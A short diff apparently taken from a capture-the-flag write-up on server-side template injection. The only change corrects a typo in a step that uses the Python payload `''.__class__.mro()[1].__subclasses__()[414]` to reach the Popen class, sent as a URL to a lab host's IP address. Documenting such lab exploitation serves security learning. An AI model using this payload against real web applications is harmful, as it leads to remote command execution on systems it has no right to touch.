@@ -45,7 +45,7 @@ The page '[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <clas
 
 ## Exploiting Popen class 
 
-- The Popen class is at the index **414**. To access it: `''.__class__.mro()[1].__subclasses__()[414]`, whcih gives the following response:
+- The Popen class is at the index **414**. To access it: `''.__class__.mro()[1].__subclasses__()[414]`, which gives the following response:
 
 ```bash
 visit "http://138.68.182.108:31862/%7B%7B''.__class__.mro()[1].__subclasses__()[414]"
